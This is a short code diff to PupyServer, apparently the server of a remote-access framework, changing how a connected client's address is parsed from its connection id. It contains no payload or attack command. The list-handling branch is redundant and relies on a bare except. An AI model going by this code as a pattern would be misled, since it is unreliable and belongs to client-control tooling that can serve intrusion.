@@ -186,11 +186,18 @@ class PupyServer(threading.Thread):
                     "native": bool(conn.get_infos("native")),
                     "sid": conn.get_infos("sid") or '',
                 }
+            address=conn._conn._config['connid']
+            try:
+                if type(address) is list:
+                    address=address[0]
+                address=conn._conn._config['connid'].rsplit(':',1)[0]
+            except:
+                address=str(address)
 
             client_info.update({
                 "id": client_id,
                 "conn" : conn,
-                "address" : conn._conn._config['connid'].rsplit(':',1)[0],
+                "address" : address
             })
 
             client_info.update(conn.namespace["get_uuid"]())
